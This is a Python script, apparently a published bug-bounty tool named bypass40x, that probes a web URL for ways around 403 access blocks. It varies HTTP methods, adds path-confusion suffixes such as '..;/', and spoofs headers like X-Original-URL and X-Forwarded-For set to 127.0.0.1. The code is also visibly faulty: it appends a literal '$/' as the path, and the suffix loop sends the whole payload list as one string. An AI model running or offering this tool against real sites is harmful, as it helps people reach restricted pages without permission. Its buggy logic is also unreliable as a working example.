# -*- coding: utf-8 -*-
# author: alpenliebe
# https://github.com/durkworf/bypass40x

import os
import sys
import argparse
import requests
import re
import random
import string
from operator import methodcaller


__version__ = '1.0'

banner=r"""

                      A
                     A A
                    A   A
                   A     A
                  A       A
                 A         A
                A           A         
               A A A A A A A A
              A               A          version {}
             A                 A
            A                   A
           A                     A
          A                       A

    [ Github ] https://github.com/durkworf/bypass40x
""".format(__version__)
use_examples=r"""
    [use help]
    python3 bypass40x.py -u http://127.0.0.1
"""
def httpmethods(url):
    dir = '$/'
    if url[-1] == '/':
        url = url+dir
    else:
        url = url+'/'+dir
    methods = ['get','post','head','options','put','patch']
    for i in methods:
        try:
            resp = methodcaller(i,url)(requests)
            print(i.upper(),' request:',resp.status_code)
        except requests.exceptions.ConnectionError:
            print('ConnectionError')
def bugbountytips(url):
    dir = '$/'
    if url[-1] == '/':
        url = url+dir
    else:
        url = url+'/'+dir
    payloads = ['.','/.','?','??','//','/./','/','..;/',random.choice('abcdefghijklmnopqrstuvwxyz!@#$%^&*()')]

    for i in payloads:
        try:
            resp = requests.get(url+str(payloads))
            print(i.upper(),'payload:',resp.status_code)
        except requests.exceptions.ConnectionError:
            print('ConnectionError')

def headerss(url):
    dir = '$/'
    if url[-1] == '/':
        url = url+dir
    else:
        url = url+'/'+dir
    payloads = {'Referer':'127.0.0.1',
                'X-Custom-IP-Authorization':'127.0.0.1',
                'X-Original-URL':'/'+dir,
                'X-Rewrite-URL':'/'+dir,
                'X-Originating-IP':'127.0.0.1',
                'X-Forwarded-For':'127.0.0.1',
                'X-Remote-IP':'127.0.0.1',
                'X-Client-IP':'127.0.0.1',
                'X-Host':'127.0.0.1',
                'X-Forwarded-Host':'127.0.0.1'
                }
    for key in payloads:
        value = payloads[key]
        header = {key:value}
        try:
            resp = requests.get(url,headers=header)
            print(key.upper(),'payload:',resp.status_code)
        except requests.exceptions.ConnectionError:
            print('ConnectionError')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 bypass40x.py -u http://127.0.0.1/')
    parser.add_argument('-u',dest='url',type=str,help='start your url with http:// or https://')
    args = parser.parse_args()
    #print(len(sys.argv))
    if len(sys.argv) == 1:
        print(banner)
        print(use_examples)
        exit()
    if re.findall('(http|https)://',args.url):
        url = args.url
    else:
        print("please start your url with http:// or https://")
        exit()
    print("[+] HTTP Methods...")
    httpmethods(url)
    print("\n[+] Bugbountytips 403 bypass methods...")
    bugbountytips(url)
    print("\n[+] HEADERS...")
    headerss(url)